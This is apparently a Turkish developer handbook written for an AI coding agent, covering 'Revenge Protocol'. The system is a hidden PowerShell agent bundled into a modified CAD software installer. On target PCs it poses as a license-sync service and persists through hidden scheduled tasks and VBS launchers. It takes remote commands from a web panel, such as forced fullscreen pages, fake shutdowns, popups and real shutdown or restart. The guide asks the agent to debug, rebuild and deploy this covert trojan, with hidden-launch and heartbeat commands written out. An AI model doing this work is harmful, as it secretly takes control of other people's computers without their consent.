# Revenge Protocol — Claude / AI agent el kitabı

Bu belge, **kulak (Windows agent) + Vercel admin panel + Neon DB** sistemini sıfırdan anlayıp komutların neden bozuk kaldığını teşhis etmek için yazıldı. Hedef: `adnan--aka` reposunda çalış, düzelt, deploy et, Halloween kurulumunu yeniden derle.

---

## 1. Ürün özeti

| Kavram | Açıklama |
|--------|----------|
| **Kulak** | Hedef PC’de gizli çalışan PowerShell: `RevengeProtocolAgent.ps1` |
| **Panel** | Next.js admin UI: `/admin` |
| **Prod URL** | `https://adnan-aka.vercel.app` |
| **Kurulum** | Yalnızca `InnoSetup/2.0.8.1_Halloween/` — resmi 2.0.8 **dokunma** |
| **QSteelCAD.exe** | Kulak **bağımsız**; CAD kapalıyken de heartbeat gider |

Kural: **Kullanıcı ekranında bir şey olmaz**, ta ki panelden komut sıraya alınana kadar.

**Kalıcılık (2026-10):** Oturum açılışında `launch-tray.vbs` → `lisans-tray.ps1` (QSteel tepsi simgesi, **QSteelCAD Lisans Senkron**). Kulak + 45 sn kontrol tepside; 1 dk yedek görev `watchdog-hidden.vbs` (görünür CMD yok). Komut türleri `web/src/lib/admin-commands.ts` + `CMD_KIND_TO_MODE`. Kaldırma: `uninstall-cleanup.ps1` + `[UninstallDelete]` → `%ProgramData%\QSteelCAD\RevengeProtocol`.

---

## 2. Git & monorepo yapısı

```
BadeCAD/                          (ana çalışma ağacı — QSteelCAD kaynak kodu)
├── InnoSetup/
│   ├── QSteelCAD_Setup.iss       ← resmi 2.0.8, DEĞİŞTİRME
│   └── 2.0.8.1_Halloween/        ← Halloween + kulak
│       ├── QSteelCAD_Setup.iss
│       ├── RevengeProtocol.iss   ← include: agent dosyaları + görevler
│       └── build_setup.cmd       → Setup_Output/QSteelCAD_Setup_2.0.8.1.exe
└── RevengeProtocol-2010/
    ├── agent/                    ← kulak (PowerShell)
    ├── web/                      ← Next.js (Vercel root: bu klasör)
    ├── install/                  ← görev kayıt scriptleri
    └── docs/
```

**GitHub (panel + agent kaynak):** `https://github.com/QSCWorks/adnan--aka`  
Yerel kopya genelde `c:\BadeCAD\RevengeProtocol-2010\` altında; BadeCAD ile aynı diskte olabilir, push ederken doğru remote’u kontrol et.

---

## 3. Vercel deploy akışı

1. **Proje kökü:** Git repo kökü `adnan--aka`; Vercel **Root Directory = `web`** (Dashboard veya `vercel project update adnan-aka --root-directory web`). Kökte `package.json` yok — Git deploy kökten çalışırsa ENOENT olur.
2. **Ortam değişkenleri** (Vercel dashboard veya CLI — değerler repoda **yok**):
   - `DATABASE_URL` — Neon Postgres (QSteelCAD-Lisans ile paylaşımlı olabilir)
   - `ADMIN_PASSWORD` — panel giriş parolası
   - `AGENT_REGISTER_KEY` — kurulumda `registerKey` ile eşleşmeli
   - `NEXT_PUBLIC_APP_URL` — `https://adnan-aka.vercel.app`
   - JWT/imza için `ADMIN_PASSWORD` aynı secret olarak kullanılır (`admin-session.ts`)
3. **Build komutu** (`package.json`): `prisma generate && prisma migrate deploy && next build`
4. **Deploy:**
   ```bash
   cd RevengeProtocol-2010/web
   npm install
   npx vercel --prod --yes
   ```
5. **Doğrulama:** `/admin` açılır, `GET /api/admin/agents` oturum cookie ister.

**Önemli:** Agent dosyası Vercel’e gitmez; sadece **API + panel**. Agent değişince **hedef PC’de** `Program Files\QSteelCAD\RevengeProtocol\` güncellenmeli veya **Halloween setup** yeniden kurulmalı.

---

## 4. Komut pipeline (uçtan uca)

```
Panel POST /api/admin/command  { agentId, kind, payload? }
  → prisma.command (status: pending)

Agent POST /api/agent/heartbeat  { agentId, secret, hostname }
  → en eski pending → status: delivered
  → buildAgentCommand(kind, settings, baseUrl, agentId, { payload, finishToken })
  → JSON { command: { kind, ... } } döner

Agent Invoke-CommandPayload(command)
  → ekran / ses / kapat vb.
```

### 4.1 Panel `kind` → sunucu `command.kind` eşlemesi

Kaynak: `web/src/lib/admin-commands.ts` (panel düğmeleri) + `web/src/lib/command-build.ts` (agent JSON).

| Panel `kind` | Agent `command.kind` | Agent davranışı |
|--------------|----------------------|-----------------|
| `scenario` | `scenario` | Chrome tam ekran → `{baseUrl}/play?...` |
| `fake_shutdown` | `scenario` | `/play?mode=fake-only&...` |
| `youtube` / `youtube_random` | `youtube` | Chrome incognito + URL |
| `open_url` / `open_random_link` | `open_url` | Chrome incognito + URL |
| **`flash`** | **`win_alert`** | `win-alert.ps1` → WScript.Popup |
| `sounds` | `sounds` | Arka plan ses job |
| `cmd_*` | `cmd_prank` | `cmd-prank-worker.ps1` |
| `surprise` | (rastgele alt kind) | `pickSurpriseKind()` |
| `shutdown` / `restart` | aynı | `shutdown.exe` |

**Sık hata:** Panel `flash` gönderir; eski agent yalnızca `flash` + `url` bekler → **hiçbir şey olmaz**. Güncel agent **`win_alert`** dinlemeli.

**Sık hata:** `buildAgentCommand('scenario')` → `finishToken` yoksa `null` → HTTP 500. Heartbeat route bunu kontrol eder.

### 4.2 Tek makinede tek komut

`command/route.ts` ve `command/batch/route.ts`: `pending` veya `delivered` varken yeni komut **409**. Agent bir sonraki heartbeat’te `delivered` olanı `done` yapar.

### 4.3 Ayarlar

- DB: `Settings` tablosu `id: global`, JSON `data`
- `mergeSettings()` — `web/src/lib/settings-defaults.ts`
- Windows uyarı metinleri: `winAlertMessages[]`, süre: `flashDurationSec`
- `pickFlashMessage()` — override → winAlertMessages → messages

---

## 5. Windows agent (kulak)

| Dosya | Rol |
|-------|-----|
| `run-agent-hidden.vbs` | Gizli PowerShell başlatır |
| `RevengeProtocolAgent.ps1` | Heartbeat döngüsü, komut icra |
| `win-alert.ps1` | WScript.Popup (Windows uyarı) |
| `cmd-prank-worker.ps1` | CMD şakaları (ayrı dosya — parse hatası önlenir) |

**Config:** `%ProgramData%\QSteelCAD\RevengeProtocol\config.json`  
**Log:** `%ProgramData%\QSteelCAD\RevengeProtocol\agent.log`

**Görevler:**
- `QSteelCAD Lisans Senkron` — ONLOGON, `/IT`, `launch.cmd` → VBS
- `QSteelCAD Lisans Senkron Kontrol` — 2 dk, `watchdog.cmd` → `ensure-agent-running.ps1`

**Mutex:** `Global\QSteelCAD_LisansSenkron_Agent`

### 5.1 Chrome (IE sorunu)

- `Open-Kiosk` **yalnızca** `chrome.exe` kullanmalı: `--incognito --new-window --start-fullscreen`
- Chrome yoksa: **URL ile varsayılan tarayıcı açma** (IE) — bilinçli olarak kaldırıldı; log: `open_url FAIL: chrome.exe yok`
- Chrome yolu: App Paths registry + Program Files + LocalAppData

### 5.2 Windows uyarı

- Panel `flash` → `win_alert` + `message` + `durationSec`
- Popup **gizli** PowerShell child’da görünmeyebilir → `win-alert.ps1` **-Sta**, **Hidden olmayan** `Start-Process`, mesaj **UTF-8 dosyadan** (`last-win-alert.txt`)

---

## 6. Bilinen arızalar & kontrol listesi

### Panel “çevrimdışı”

1. `agent.log` son satırlar `heartbeat ok` mi?
2. `config.json` `apiUrl` prod mu?
3. `AGENT_REGISTER_KEY` ↔ `registerKey` eşleşmesi
4. Görev Zamanlayıcı görevleri var mı?

### Komut sıraya alındı, ekranda yok

1. `agent.log` içinde `exec kind=win_alert` / `open_url chrome` var mı?
2. Agent dosyaları kurulumdan **eski** mi? (özellikle `RevengeProtocolAgent.ps1`, `win-alert.ps1`)
3. Chrome yüklü mü?
4. `buildAgentCommand` çıktısı — heartbeat yanıtını simüle et (PowerShell `Invoke-RestMethod`)

### Internet Explorer açılıyor

- Eski agent: `Start-Process $Url` fallback
- Çözüm: agent güncelle + Chrome kurulu olsun

### Windows uyarı gelmiyor

- Eski agent `win_alert` case yok
- Gizli `-WindowStyle Hidden` ile Popup
- Mesaj komut satırında kırılıyor → `-MessageFile` kullan

### CMD şakaları çalışmıyor

- Agent parse hatası — worker ayrı dosyada mı?
- `$cmd.lines` JSON array — boşsa varsayılan satırlar

### Senaryo / play sayfası

- `NEXT_PUBLIC_APP_URL` doğru olmalı
- Agent `Open-Kiosk` ile `/play` açar

---

## 7. Geliştirme sırası (önerilen)

1. **Agent fix** → `RevengeProtocol-2010/agent/*.ps1`
2. **Web/API fix** → `web/src/lib/command-build.ts`, `admin-commands.ts`, API routes
3. `cd web && npx next build` → `npx vercel --prod --yes`
4. Hedef PC: agent dosyalarını kopyala **veya** `InnoSetup/2.0.8.1_Halloween/build_setup.cmd`
5. Panelden tek komut test et; `agent.log` oku

### Hızlı agent güncelleme (dev PC)

```powershell
$dst = "$env:ProgramFiles\QSteelCAD\RevengeProtocol"
Copy-Item "c:\BadeCAD\RevengeProtocol-2010\agent\*.ps1" $dst -Force
Get-ScheduledTask "*Lisans Senkron*" | Start-ScheduledTask -ErrorAction SilentlyContinue
# veya VBS:
Start-Process wscript.exe -ArgumentList '//B',"$dst\run-agent-hidden.vbs" -WindowStyle Hidden
Get-Content "$env:ProgramData\QSteelCAD\RevengeProtocol\agent.log" -Tail 15
```

### API test (flash → win_alert)

Panel oturumu olmadan agent tarafı:

```powershell
$cfg = Get-Content "$env:ProgramData\QSteelCAD\RevengeProtocol\config.json" | ConvertFrom-Json
Invoke-RestMethod POST "$($cfg.apiUrl)/api/agent/heartbeat" -ContentType application/json `
  -Body (@{ agentId=$cfg.agentId; secret=$cfg.secret; hostname=$env:COMPUTERNAME } | ConvertTo-Json)
# Önce panelden flash komutu sıraya al; heartbeat yanıtında command.kind = win_alert olmalı
```

---

## 8. Dosya indeksi (değiştirirken)

| Alan | Dosyalar |
|------|----------|
| Komut kaydı | `web/src/lib/admin-commands.ts` |
| Agent JSON | `web/src/lib/command-build.ts` |
| Heartbeat | `web/src/app/api/agent/heartbeat/route.ts` |
| Panel UI | `web/src/app/admin/admin-panel.tsx` |
| Agent icra | `agent/RevengeProtocolAgent.ps1` |
| Kurulum | `InnoSetup/2.0.8.1_Halloween/RevengeProtocol.iss` |
| Görevler | `install/register-logon-task.ps1`, `ensure-agent-running.ps1` |

---

## 9. Claude’a verilecek kısa görev şablonu

```
Revenge Protocol: Panel komutları hedef PC'de tutarsız.

1) agent.log + config.json ile teşhis
2) command-build.ts ↔ RevengeProtocolAgent.ps1 kind eşlemesini doğrula
3) Windows uyarı: win_alert + win-alert.ps1 (STA, MessageFile, görünür popup)
4) URL: yalnız Chrome --incognito --new-window --start-fullscreen, IE fallback yok
5) web: vercel --prod; agent: setup yeniden derle veya Program Files kopyala
6) Her kind için test matrisi doldur (scenario, flash, youtube, cmd_chaos, sounds)

Repo: github.com/QSCWorks/adnan--aka, web kök: RevengeProtocol-2010/web
Prod: https://adnan-aka.vercel.app/admin
```

---

## 10. Sürüm / deploy notları

- Panel deploy **agent’ı otomatik güncellemez**.
- Halloween EXE: `InnoSetup/Setup_Output/QSteelCAD_Setup_2.0.8.1.exe`
- Secrets örnek (git’e koyma): `RevengeProtocol-2010/DEPLOY_SECRETS.local.txt`

Son agent düzeltmeleri (referans):
- Chrome registry + IE fallback kaldırıldı
- `win_alert` → UTF-8 dosya + STA subprocess
- `agent.log` satırı: `exec kind=...`, `win_alert start:`, `open_url chrome incognito:`
